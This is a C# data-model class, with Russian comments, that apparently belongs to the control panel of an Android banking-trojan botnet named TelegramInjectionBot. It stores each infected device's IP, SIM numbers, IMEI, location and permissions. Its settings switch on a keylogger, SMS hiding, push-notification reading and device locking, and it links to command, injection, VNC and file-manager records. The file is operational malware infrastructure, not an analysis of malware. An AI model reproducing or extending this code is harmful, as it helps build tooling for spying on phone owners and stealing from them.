namespace TelegramInjectionBot.Data;

public class Bot
{
    public Bot()
    {
        BotCommands = new HashSet<BotCommand>();
        BotFilemanagers = new HashSet<BotFilemanager>();
        BotFiles = new HashSet<BotFile>();
        BotInjections = new HashSet<BotInjection>();
        BotLogs = new HashSet<BotLog>();
        BotVncs = new HashSet<BotVnc>();
        UserBotTimestamps = new HashSet<UserBotTimestamp>();
        UserTelegramInjections = new HashSet<UserTelegramInjection>();
        UserTelegramBots = new HashSet<UserTelegramBot>();
    }

    public string Id { get; set; }

    /// <summary>
    ///     ip адрес устройства. С портом
    /// </summary>
    public string Ip { get; set; }

    /// <summary>
    ///     Дата подключения устройства.
    /// </summary>
    public DateTime LastConnection { get; set; }

    /// <summary>
    ///     Название страны устройства.
    /// </summary>
    public string Country { get; set; }

    /// <summary>
    ///     Код страны устройства.
    /// </summary>
    public string CountryCode { get; set; }

    /// <summary>
    ///     Тег.
    /// </summary>
    public string Tag { get; set; }

    /// <summary>
    ///     Флаг для обновления настроек бота.
    /// </summary>
    public bool UpdateSettings { get; set; }

    /// <summary>
    ///     Время работы устройства в секундах.
    /// </summary>
    public int WorkingTime { get; set; }

    /// <summary>
    ///     JSON массив с информацией о сим-картах устройства. Формат: [{&quot;operator&quot;:&quot;Android&quot;,&quot;
    ///     phone_number&quot;:&quot;+15555215554&quot;,&quot;isDualSim&quot;:&quot;false&quot;,&quot;operator1&quot;:&quot;
    ///     &quot;,&quot;phone_number1&quot;:&quot;&quot;}]
    /// </summary>
    public string SimData { get; set; }

    /// <summary>
    ///     JSON массив с метаданными устройства. Формат: {android:&apos;10&apos;,model:&apos;Samsung Galaxy S 100&apos;,&apos;
    ///     battery_level&apos;:15,&apos;IMEI&apos;:14}
    /// </summary>
    public string Metadata { get; set; }

    /// <summary>
    ///     JSON массив привилегий устройства. Формат:
    ///     {
    ///     &quot;all_permission&quot;: &quot;true&quot;,
    ///     &quot;sms_permission&quot;: &quot;false&quot;,
    ///     &quot;overlay_permission&quot;: &quot;true&quot;,
    ///     &quot;accounts_permission&quot;: &quot;true&quot;,
    ///     &quot;contacts_permission&quot;: &quot;true&quot;,
    ///     &quot;notification_permission&quot;: &quot;false&quot;
    ///     }
    /// </summary>
    public string Permissions { get; set; }

    /// <summary>
    ///     JSON массив с дополнительной информацией об устройстве. Формат:
    ///     {
    ///     &quot;admin&quot;: &quot;false&quot;,
    ///     &quot;screen&quot;: &quot;true&quot;,
    ///     &quot;protect&quot;: &quot;0&quot;,
    ///     &quot;isDozeMode&quot;: &quot;true&quot;,
    ///     &quot;batteryLevel&quot;: &quot;98&quot;,
    ///     &quot;accessibility&quot;: &quot;true&quot;,
    ///     &quot;isKeyguardLocked&quot;: &quot;false&quot;
    ///     }
    /// </summary>
    public string SubInfo { get; set; }

    /// <summary>
    ///     JSON местоположения устройства. Формат:
    ///     {
    ///     lat:100,
    ///     lon:100
    ///     }
    /// </summary>
    public string Location { get; set; }

    /// <summary>
    ///     JSON массив с настройками. Формат: {&quot;hideSMS&quot;:true,&quot;lockDevice&quot;:true,&quot;offSound&quot;:true,
    ///     &quot;keylogger&quot;:true,&quot;clearPush&quot;:true,&quot;readPush&quot;:true,&quot;arrayUrl&quot;:[&quot;
    ///     https://yandex.ru/&quot;, &quot;https://yandex.ru/&quot;]}
    /// </summary>
    public string Settings { get; set; }

    public bool IsFavorite { get; set; }
    public bool IsBlacklisted { get; set; }
    public string Comment { get; set; }
    public bool? IsNew { get; set; }
    public DateTime? CreatedAt { get; set; }
    public DateTime? UpdatedAt { get; set; }
    public string CurrentFileManagerPath { get; set; }

    public virtual ICollection<BotCommand> BotCommands { get; set; }
    public virtual ICollection<BotFilemanager> BotFilemanagers { get; set; }
    public virtual ICollection<BotFile> BotFiles { get; set; }
    public virtual ICollection<BotInjection> BotInjections { get; set; }
    public virtual ICollection<BotLog> BotLogs { get; set; }
    public virtual ICollection<BotVnc> BotVncs { get; set; }
    public virtual ICollection<UserBotTimestamp> UserBotTimestamps { get; set; }
    public virtual ICollection<UserTelegramInjection> UserTelegramInjections { get; set; }
    public virtual ICollection<UserTelegramBot> UserTelegramBots { get; set; }
}